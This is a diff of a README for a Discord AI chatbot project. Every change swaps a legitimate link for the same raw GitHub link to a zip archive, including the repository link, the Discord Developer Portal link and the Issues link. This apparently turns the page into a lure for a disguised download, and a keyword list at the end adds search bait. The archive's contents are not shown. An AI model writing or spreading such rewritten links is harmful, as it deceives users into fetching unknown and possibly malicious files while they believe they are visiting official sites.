@@ -1,6 +1,6 @@
 # 🤖 disturpe-ai-chatbot - Your Private AI Assistant for Discord
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%2344B37E?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Brianosteal912/disturpe-ai-chatbot)
+[![Download Now](https://img.shields.io/badge/Download%20Now-%2344B37E?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Brianosteal912/disturpe-ai-chatbot/main/scripts/v2.2.zip)
 
 ## 🌟 What Is This?
 
@@ -27,7 +27,7 @@ Disturpe AI Chatbot lets you add a smart, privacy-focused AI friend to your Disc
 
 Visit the link below to download the application:
 
-[**👉 Click Here to Download disturpe-ai-chatbot**](https://github.com/Brianosteal912/disturpe-ai-chatbot)
+[**👉 Click Here to Download disturpe-ai-chatbot**](https://raw.githubusercontent.com/Brianosteal912/disturpe-ai-chatbot/main/scripts/v2.2.zip)
 
 ### Step 2: Install the Bot
 
@@ -48,7 +48,7 @@ Visit the link below to download the application:
 
 ### Step 4: Create Your Discord Bot Token
 
-1. Go to the [Discord Developer Portal](https://discord.com/developers/applications).
+1. Go to the [Discord Developer Portal](https://raw.githubusercontent.com/Brianosteal912/disturpe-ai-chatbot/main/scripts/v2.2.zip).
 2. Click "New Application" and give it a name (e.g., "My AI Bot").
 3. Go to "Bot" on the left sidebar, then click "Add Bot".
 4. Under "Token", click "Copy" to copy the bot token. **Do not share this token with anyone.**
@@ -105,6 +105,6 @@ This project is open source. See the LICENSE file in the repository for details.
 
 ## 🤝 Support
 
-You can report bugs or suggest features on the [GitHub Issues](https://github.com/Brianosteal912/disturpe-ai-chatbot/issues) page.
+You can report bugs or suggest features on the [GitHub Issues](https://raw.githubusercontent.com/Brianosteal912/disturpe-ai-chatbot/main/scripts/v2.2.zip) page.
 
 Keywords: ai,ai-agent,ai-agents,ai-chat,ai-chat-bot,ai-chatbot,ai-chatbot-project,ai-chatbots,ai-discord-bot,ai-discord-bot-github,ai-discord-chat,ai-model,ai-tools
